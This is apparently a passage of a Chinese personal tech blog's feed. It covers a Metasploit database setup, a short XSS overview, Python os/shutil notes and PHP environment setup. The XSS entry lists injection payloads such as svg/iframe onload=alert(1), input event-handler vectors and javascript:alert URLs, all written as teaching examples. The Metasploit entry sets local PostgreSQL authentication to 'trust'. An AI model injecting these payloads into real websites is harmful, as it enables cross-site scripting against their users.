href="#编辑postgresql本地启动"></a> 编辑postgresql，本地启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; cd /etc/postgresql/10/main</span><br><span class="line">&gt;&gt; cp pg_hba.conf pg_hba.conf.backup</span><br><span class="line">&gt;&gt; vim pg_hba.conf</span><br><span class="line">...</span><br><span class="line"># TYPE  DATABASE        USER            ADDRESS                 METHOD</span><br><span class="line"></span><br><span class="line"># &quot;local&quot; is for Unix domain socket connections only</span><br><span class="line">local   all             all                                     trust</span><br><span class="line"># IPv4 local connections:</span><br><span class="line">host    all             all             127.0.0.1/32            trust</span><br><span class="line"># IPv6 local connections:</span><br><span class="line">host    all             all             ::1/128                 trust</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="启动msf查看状态"><a class="markdownIt-Anchor" href="#启动msf查看状态"></a> 启动msf,查看状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; msfconsole</span><br><span class="line">&gt;&gt; db_status</span><br></pre></td></tr></table></figure><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://www.secpulse.com/archives/33281.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/33281.html</a></p><p><a href="https://www.jianshu.com/p/9c82ccb2aaf7" target="_blank" rel="noopener">https://www.jianshu.com/p/9c82ccb2aaf7</a></p><p><a href="https://blog.csdn.net/sanbingyutuoniao123/article/details/52209653" target="_blank" rel="noopener">https://blog.csdn.net/sanbingyutuoniao123/article/details/52209653</a></p><p><a href="https://docs.kali.org/general-use/starting-metasploit-framework-in-kali" target="_blank" rel="noopener">https://docs.kali.org/general-use/starting-metasploit-framework-in-kali</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装kali系统&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#安装kali系统&quot;&gt;&lt;/a&gt; 安装Kali系统&lt;/h1&gt;
&lt;p&gt;推荐使用虚拟机，太简单不赘述。&lt;/p&gt;
&lt;h1 id=&quot;配置数据库&quot;&gt;&lt;a class=&quot;markdownI
      
    
    </summary>
    
      <category term="Linux_security" scheme="http://yoursite.com/categories/Linux-security/"/>
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>执行XSS代码</title>
    <link href="http://yoursite.com/2018/06/23/%E6%89%A7%E8%A1%8CXSS%E4%BB%A3%E7%A0%81/"/>
    <id>http://yoursite.com/2018/06/23/执行XSS代码/</id>
    <published>2018-06-23T07:50:19.000Z</published>
    <updated>2018-06-24T04:39:23.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>前面简单的总结了一下xss的常见的攻击，搭建了xss平台。也算一个了解了，但对于xss执行，并没有总结一下有哪些方式，恰逢假日，又看到一篇文章，遂，总结如下。</p><h1 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h1><ol><li>反射型xss</li><li>存储型xss</li><li>DOM型xss</li><li>UXSS</li><li>MXSS</li></ol><h3 id="uxss"><a class="markdownIt-Anchor" href="#uxss"></a> UXSS：</h3><blockquote><p>一种针对浏览器的xss，比起普通的xss，其危害在于，它危害的是浏览器本身，譬如根据浏览器本身功能的缺陷，或者根据浏览器拓展的功能缺陷，生成并执行代码</p></blockquote><blockquote><p>Unlike the common XSS attacks, UXSS is a type of attack that exploits client-side vulnerabilities in the browser or browser extensions in order to generate an XSS condition, and execute malicious code.</p></blockquote><h3 id="mxss"><a class="markdownIt-Anchor" href="#mxss"></a> MXSS</h3><blockquote><p>指的是一些本来看起来没有危害的html/js代码，经过浏览器渲染，形成了有危害的xss代码，其英文全称为：<strong>Mutation-based Cross-Site-Scripting</strong> 突变性xss<br><img src="/images/mxss.jpg" alt="mxss"></p></blockquote><h1 id="html-xss"><a class="markdownIt-Anchor" href="#html-xss"></a> html xss</h1><blockquote><p>顾名思义，就是在html里面构造的xss。 一般就是闭合尖括号，然后植入脚本</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- &#123;&#123; user input &#125;&#125; --&gt;</span><br><span class="line">    &lt;div&gt;&lt;/div&gt;&lt;svg onload=alert(1)&gt;&lt;div&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;&lt;/div&gt;&lt;iframe onload=alert(1)&gt;&lt;div&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;&lt;/div&gt;&lt;script src=&apos;xx.js&apos;&gt;&lt;/script&gt;&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="属性-xss"><a class="markdownIt-Anchor" href="#属性-xss"></a> 属性 xss</h1><blockquote><p>在html标签里面的属性，存在用户输入，从而造成的xss，可分为三种，双引号，单引号，无引号</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- &#123;&#123; user input &#125;&#125; --&gt;</span><br><span class="line">    &lt;input value=&quot;&quot; autofocus onfocus=&quot;alert(1)&quot;&gt;</span><br><span class="line">    &lt;input value=&apos;&apos; onmouseover=&quot;alert(1)&quot;</span><br><span class="line">    &lt;input value=&apos;&apos; autofocus onblur=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">onfocus 将焦点放在input里面</span><br><span class="line">onmouseover 鼠标移入事件</span><br><span class="line">onblur 鼠标移出事件</span><br></pre></td></tr></table></figure><h1 id="url-xss"><a class="markdownIt-Anchor" href="#url-xss"></a> URL xss</h1><blockquote><p>这种xss 一般存在与a 标签里面</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;Click&lt;/a&gt;</span><br><span class="line">&lt;iframe src=&quot;&#123;&#123;userinput&#125;&#125;&quot; /&gt;</span><br><span class="line">&lt;base href=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;</span><br><span class="line">&lt;form action=&#123;&#123;userinput&#125;&#125;&gt;</span><br><span class="line">&lt;frameset&gt;&lt;frame src=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;/frameset&gt;</span><br><span class="line"></span><br><span class="line">javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><h1 id="javascript-xss"><a class="markdownIt-Anchor" href="#javascript-xss"></a> Javascript xss</h1><blockquote><p>根据不同的js代码，进行构造，一般闭合大括号，引号等等。</p></blockquote><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>XSS也算很老的漏洞的了，但总是有人可以把它玩出花来。</p><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> reference</h1><p><a href="https://www.acunetix.com/blog/articles/universal-cross-site-scripting-uxss/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/universal-cross-site-scripting-uxss/</a></p><p><a href="http://imweb.io/topic/55e3c132771670e207a16bcf" target="_blank" rel="noopener">http://imweb.io/topic/55e3c132771670e207a16bcf</a></p><p><a href="https://www.anquanke.com/post/id/148357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/148357</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;前面简单的总结了一下xss的常见的攻击，搭建了xss平台。也算一个了解了，但对于xss执行，并没有总结一下有哪些方式，恰逢假日，又看到一篇文章，
      
    
    </summary>
    
      <category term="web_security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>python模块-shutil</title>
    <link href="http://yoursite.com/2018/06/21/python%E6%A8%A1%E5%9D%97-shutil/"/>
    <id>http://yoursite.com/2018/06/21/python模块-shutil/</id>
    <published>2018-06-21T13:52:26.000Z</published>
    <updated>2018-06-21T13:52:51.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>shutil模块提供了基于文件和文件夹的更高维度的操作，例如复制和移除等等</p></blockquote><h1 id="文件操作"><a class="markdownIt-Anchor" href="#文件操作"></a> 文件操作</h1><h2 id="shutilcopyfilesrcdstfollow_symlinkstrue"><a class="markdownIt-Anchor" href="#shutilcopyfilesrcdstfollow_symlinkstrue"></a> shutil.copyfile(src,dst,follow_symlinks=True)</h2><blockquote><p>复制一个文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># dst也必须是一个文件名.</span><br><span class="line">shutil.copyfile(&apos;D://new_folder2/test2/testsample.txt&apos;,&quot;D://new_folder2//testsample.txt&quot;)</span><br></pre></td></tr></table></figure><h2 id="shutilcopysrcdstfollow_symlinkstrue"><a class="markdownIt-Anchor" href="#shutilcopysrcdstfollow_symlinkstrue"></a> shutil.copy(src,dst,follow_symlinks=True)</h2><blockquote><p>针对文件，复制操作</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copy(&apos;D://new_folder2//test2//testsample.txt&apos;,&quot;D://new_folder2//testsample2.txt&quot;)</span><br></pre></td></tr></table></figure><h2 id="shutilcopy2srcdstfollow_symlinkstrue"><a class="markdownIt-Anchor" href="#shutilcopy2srcdstfollow_symlinkstrue"></a> shutil.copy2(src,dst,follow_symlinks=True)</h2><blockquote><p>类似copy，不同的是，这个copy会同样复制文件的元数据。元数据指的是一个文件的权限，大小，创建时间等等。</p></blockquote><h2 id="shutilcopytreesrcdst"><a class="markdownIt-Anchor" href="#shutilcopytreesrcdst"></a> shutil.copytree(src,dst)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copytree(src, dst, symlinks=False, ignore=None,copy_function=copy2, ignore_dangling_symlinks=False)</span><br></pre></td></tr></table></figure><blockquote><p>复制文件夹,底下的文件，文件夹都会被复制。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copytree(&apos;D://new_folder2//test2&apos;,&quot;D://new_folder2//test222&quot;,copy_function=shutil.copy2)</span><br></pre></td></tr></table></figure><h2 id="shutilrmtreepath"><a class="markdownIt-Anchor" href="#shutilrmtreepath"></a> shutil.rmtree(path)</h2><blockquote><p>移除文件夹及底下的文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.rmtree(&quot;D://new_folder2//test222&quot;)</span><br></pre></td></tr></table></figure><h2 id="shutilmovesrcdstcopy_functioncopy2"><a class="markdownIt-Anchor" href="#shutilmovesrcdstcopy_functioncopy2"></a> shutil.move(src,dst,copy_function=copy2)</h2><blockquote><p>递归移动一个文件或者文件夹到dst，然后返回路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shutil.move(&apos;D://new_folder2/test3&apos;,&apos;D://new_folder2/test4&apos;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;&gt;返回D://new_folder2/test4\test2</span><br></pre></td></tr></table></figure><h2 id="shutildisk_usagepath"><a class="markdownIt-Anchor" href="#shutildisk_usagepath"></a> shutil.disk_usage(path)</h2><blockquote><p>返回以bytes为单位的磁盘使用情况</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(shutil.disk_usage(&apos;D://&apos;))</span><br><span class="line">&gt;&gt;&gt;&gt; usage(total=84001771520, used=76966387712, free=7035383808)</span><br></pre></td></tr></table></figure><h2 id="shutilchownpathusernonegroupnone"><a class="markdownIt-Anchor" href="#shutilchownpathusernonegroupnone"></a> shutil.chown(path,user=None,group=None)</h2><blockquote><p>改变一个文件/文件夹的所有者</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.chown(path,user,group)</span><br></pre></td></tr></table></figure><h2 id="shutilwhichcmd"><a class="markdownIt-Anchor" href="#shutilwhichcmd"></a> shutil.which(cmd)</h2><blockquote><p>显示可执行程序所在的路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.which(&apos;python&apos;)</span><br></pre></td></tr></table></figure><h1 id="归档压缩操作"><a class="markdownIt-Anchor" href="#归档压缩操作"></a> 归档压缩操作</h1><h2 id="shutilmake_archivebasenameformatroot_dirbase_dir"><a class="markdownIt-Anchor" href="#shutilmake_archivebasenameformatroot_dirbase_dir"></a> shutil.make_archive(basename,format,root_dir,base_dir)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">basename: 要创建的压缩文件名，需要包含路径</span><br><span class="line">format： zip,tar,gztar,bztar,zxtar</span><br><span class="line">root_dir: 先进去这个root_dir的目录，然后在压缩base_dir的所有东西</span><br><span class="line">base_dir: 路径的前缀</span><br><span class="line"></span><br><span class="line">shutil.make_archive(&quot;D://new_folder2/test3&quot;,&apos;zip&apos;,&apos;D://new_folder2/&apos;,&apos;D://new_folder2/test3&apos;)</span><br></pre></td></tr></table></figure><h2 id="shutilunpack_archivefilenameextract_dirformat"><a class="markdownIt-Anchor" href="#shutilunpack_archivefilenameextract_dirformat"></a> shutil.unpack_archive(filename,extract_dir,format)</h2><blockquote><p>解压缩</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># test1 不存在，但是会自动创建</span><br><span class="line">shutil.unpack_archive(&apos;D://new_folder2/test3.zip&apos;,&quot;D://new_folder2//test1&quot;,&quot;zip&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;shutil模块提供了基于文件和文件夹的更高维度的操作，例如复制和移除等等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1
      
    
    </summary>
    
      <category term="python_modules" scheme="http://yoursite.com/categories/python-modules/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>配置phpstorm</title>
    <link href="http://yoursite.com/2018/06/20/%E9%85%8D%E7%BD%AEphpstorm/"/>
    <id>http://yoursite.com/2018/06/20/配置phpstorm/</id>
    <published>2018-06-20T15:08:31.000Z</published>
    <updated>2018-06-20T15:51:10.621Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>打开工具栏上面的Tools --&gt; Deployment --&gt; configuration<br><img src="/images/phpstorm1.jpeg" alt="phpstorm1"><br><img src="/images/phpstorm2.jpeg" alt="phpstorm2"></p></li><li><p>点击 Edit Configurations<br><img src="/images/phpstorm3.jpeg" alt="phpstorm3"></p></li><li><p>new 一个新的配置<br><img src="/images/phpstorm4.jpeg" alt="phpstorm4"><br><img src="/images/phpstorm5.jpeg" alt="phpstorm5"></p></li><li><p>写完代码，upload到localhost中。需要注意，当前用户需要对/var/www/html 这个文件夹有写入权限.然后点击运行。<br><img src="/images/phpstorm6.jpeg" alt="phpstorm6"></p></li><li><p>参考<br><a href="https://segmentfault.com/a/1190000003695273" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003695273</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;
&lt;p&gt;打开工具栏上面的Tools --&amp;gt; Deployment --&amp;gt; configuration&lt;br&gt;
&lt;img src=&quot;/images/phpstorm1.jpeg&quot; alt=&quot;phpstorm1&quot;&gt;&lt;br&gt;
&lt;img src=&quot;/imag
      
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/categories/php/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>python模块-os</title>
    <link href="http://yoursite.com/2018/06/20/python%E6%A8%A1%E5%9D%97-os/"/>
    <id>http://yoursite.com/2018/06/20/python模块-os/</id>
    <published>2018-06-20T14:50:03.000Z</published>
    <updated>2018-06-20T15:53:51.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>这个模块提供了很多简单方便的方式去调用操作系统开放的功能，至于更高维度的文件，文件夹操作的方法需要参考 shutil 这个模块<br>在python中，文件名字，命令行参数，环境变量都是字符串。因此一些系统的字符转换就是必须的。可以使用 sys.getfilesystemencoding() 查看系统编码</p></blockquote><h1 id="系统"><a class="markdownIt-Anchor" href="#系统"></a> 系统</h1><h2 id="osenviron"><a class="markdownIt-Anchor" href="#osenviron"></a> os.environ</h2><blockquote><p>返回环境变量</p></blockquote><h2 id="osgetenvkey"><a class="markdownIt-Anchor" href="#osgetenvkey"></a> os.getenv(key)</h2><blockquote><p>得到key值的环境变量</p></blockquote><h2 id="osuname"><a class="markdownIt-Anchor" href="#osuname"></a> os.uname()</h2><blockquote><p>相当于Linux的uname，得到系统的信息</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.uname()</span><br><span class="line">(&apos;Linux&apos;, &apos;VM_16_8_centos&apos;, &apos;3.10.0-514.26.2.el7.x86_64&apos;, &apos;#1 SMP Tue Jul 4 15:04:05 UTC 2017&apos;, &apos;x86_64&apos;)</span><br></pre></td></tr></table></figure><h2 id="osgetuid"><a class="markdownIt-Anchor" href="#osgetuid"></a> os.getuid</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid, </span><br><span class="line">os.getgid</span><br><span class="line">gid,</span><br></pre></td></tr></table></figure><h2 id="osgetgroups"><a class="markdownIt-Anchor" href="#osgetgroups"></a> os.getgroups()</h2><blockquote><p>返回当前进程相关的group</p></blockquote><h2 id="osgetlogin"><a class="markdownIt-Anchor" href="#osgetlogin"></a> os.getlogin()</h2><blockquote><p>得到当前登录的用户</p></blockquote><h2 id="ospopencmdmoderbuffering-1"><a class="markdownIt-Anchor" href="#ospopencmdmoderbuffering-1"></a> os.popen(cmd,mode=‘r’,buffering=-1)</h2><blockquote><p>执行系统级别的命令，但是没有输出。 mode有 read和write两种模式。 但是常见的还是subprocess这个命令</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">with os.popen(&apos;git clone https://github.com/zhuzhuyule/img_to_txt.git&apos;)as f:</span><br><span class="line">  a = f.read()</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><h1 id="文件夹操作"><a class="markdownIt-Anchor" href="#文件夹操作"></a> 文件夹操作</h1><h2 id="osmkdirpath"><a class="markdownIt-Anchor" href="#osmkdirpath"></a> os.mkdir(path)</h2><blockquote><p>创建一个文件夹</p></blockquote><h2 id="osrmdirpath"><a class="markdownIt-Anchor" href="#osrmdirpath"></a> os.rmdir(path)</h2><blockquote><p>移除文件夹</p></blockquote><h2 id="osmakedirspath"><a class="markdownIt-Anchor" href="#osmakedirspath"></a> os.makedirs(path)</h2><blockquote><p>创建一系列文件夹</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.makedirs(&apos;test/test/test&apos;)</span><br></pre></td></tr></table></figure><h2 id="osremovedirspath"><a class="markdownIt-Anchor" href="#osremovedirspath"></a> os.removedirs(path)</h2><blockquote><p>移除文件夹，包括子文件夹. 递归移除.如下，先移除最里面的test，然后是外层的test，最后在移除最外面的test</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.removedirs(&apos;test/test/test&apos;)</span><br></pre></td></tr></table></figure><h2 id="oschdirpath"><a class="markdownIt-Anchor" href="#oschdirpath"></a> os.chdir(path)</h2><blockquote><p>变换路径</p></blockquote><h1 id="文件"><a class="markdownIt-Anchor" href="#文件"></a> 文件</h1><h2 id="oslistdirpath"><a class="markdownIt-Anchor" href="#oslistdirpath"></a> os.listdir(path)</h2><blockquote><p>列出当前文件夹下面的所有文件和文件夹</p></blockquote><h2 id="osscandirpath"><a class="markdownIt-Anchor" href="#osscandirpath"></a> os.scandir(path)</h2><blockquote><p>扫描当前路径下面的所有文件和文件夹，返回一个DirEntry对象。有以下属性</p></blockquote><ol><li>name</li><li>path</li><li>is_file</li><li>is_dir</li><li>inode</li><li>is_symlink</li></ol><h2 id="osremovepath"><a class="markdownIt-Anchor" href="#osremovepath"></a> os.remove(path)</h2><blockquote><p>path是文件的路径，注意，一定得是文件才能够删除。文件夹不能这样删</p></blockquote><h2 id="osrenamesrcdst"><a class="markdownIt-Anchor" href="#osrenamesrcdst"></a> os.rename(src,dst)</h2><blockquote><p>在Unix 中，如果dst是个已经存在的文件，如果用户有权限，那么该文件会被没有提示的替换<br>在windows中，如果dst已经存在，那么就会出错，即使dst是个文件，而不是文件夹<br>rename具有移动文件夹（无论文件夹里面是否有文件），并且重命名的功能</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.rename(&quot;d://New&quot;,&quot;d://new_folder&quot;)  # 重命名</span><br><span class="line">&gt;&gt;&gt; os.rename(&quot;d://new_folder&quot;,&quot;new_folder2&quot;) # 将文件夹移动到当前目录并且改名</span><br><span class="line">&gt;&gt;&gt; os.renmae(&quot;new_folder2&quot;,&quot;d://new_folder&quot;) # 文件夹里面还有文件，也可以移动+改名</span><br></pre></td></tr></table></figure><h2 id="osrenamesoldnew"><a class="markdownIt-Anchor" href="#osrenamesoldnew"></a> os.renames(old,new)</h2><blockquote><p>将old层级文件夹全部改名为new的层级文件夹</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.renames(&quot;d://new_folder2//test2//test2.txt&quot;,&quot;d://new_folder2//test1//test1.txt&quot;)</span><br><span class="line">此时 test2 文件夹会变成test1文件夹， test2.txt 会变成test1.txt</span><br><span class="line">而与rename不同的是：</span><br><span class="line"> rename如果test2文件夹不存在，就会出错。（但是如果文件夹存在就不会出错）</span><br><span class="line"> rename是不会出错的。不管文件夹存不存在。但是如果文件夹之前存在，他就会被改名消失。除非这个文件夹里面还有其他东西，这样这个文件夹就不会被改名消失。</span><br></pre></td></tr></table></figure><h2 id="oswalkpath"><a class="markdownIt-Anchor" href="#oswalkpath"></a> os.walk(path)</h2><blockquote><p>返回一个generator对象，分别有三个值： root, dirs, files,</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root ： 返回当前路径下所有文件夹的路径，字符串</span><br><span class="line">dirs： 返回一个list，返回当前路径下的文件夹名称，如果子文件夹还有文件夹，返回另外一个list</span><br><span class="line">files： 返回list，类似dirs，只不过返回的是文件名。</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; for root,dirs,files in os.walk(&quot;d://new_folder2//&quot;):</span><br><span class="line">print(&quot;files: &quot;,files)</span><br><span class="line">print(&quot;root: &quot;,root)</span><br><span class="line">print(&quot;dirs: &quot;,dirs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files:  [&apos;test.txt&apos;]</span><br><span class="line">root: d://new_folder2//</span><br><span class="line">dirs: [&apos;test1&apos;, &apos;test2&apos;]</span><br><span class="line">files:  [&apos;test1.txt&apos;]</span><br><span class="line">root: d://new_folder2//test1</span><br><span class="line">dirs: []</span><br><span class="line">files:  [&apos;test2.txt&apos;, &apos;testsample.txt&apos;]</span><br><span class="line">root: d://new_folder2//test2</span><br><span class="line">dirs: [&apos;teste233&apos;]</span><br><span class="line">files:  []</span><br><span class="line">root: d://new_folder2//test2\teste233</span><br><span class="line">dirs: []</span><br></pre></td></tr></table></figure><h2 id="osreplace"><a class="markdownIt-Anchor" href="#osreplace"></a> os.replace()</h2><blockquote><p>这个是跨平台的os.rename</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># test1 是存在的文件夹</span><br><span class="line">#os.replace(&apos;D://new_folder2//test2/test2.txt&apos;,&quot;D://new_folder2//test1//test21.txt&quot;)</span><br><span class="line"></span><br><span class="line"># test5 是不存在的文件夹， 失败</span><br><span class="line">#os.replace(&apos;D://new_folder2//test4/test1.txt&apos;,&quot;D://new_folder2//test5//test51.txt&quot;)</span><br><span class="line"></span><br><span class="line">#成功</span><br><span class="line">#os.replace(&apos;D://new_folder2//test1&apos;,&quot;D://new_folder2//test4&quot;)</span><br><span class="line"></span><br><span class="line"># 成功</span><br><span class="line"># os.renames(&apos;D://new_folder2//test1/test21.txt&apos;,&quot;D://new_folder2//test3//test21.txt&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;这个模块提供了很多简单方便的方式去调用操作系统开放的功能，至于更高维度的文件，文件夹操作的方法需要参考 shutil 
      
    
    </summary>
    
      <category term="python_modules" scheme="http://yoursite.com/categories/python-modules/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>在ubuntu18下配置php开发环境</title>
    <link href="http://yoursite.com/2018/06/20/%E5%9C%A8ubuntu18%E4%B8%8B%E9%85%8D%E7%BD%AEphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <id>http://yoursite.com/2018/06/20/在ubuntu18下配置php开发环境/</id>
    <published>2018-06-20T11:30:22.000Z</published>
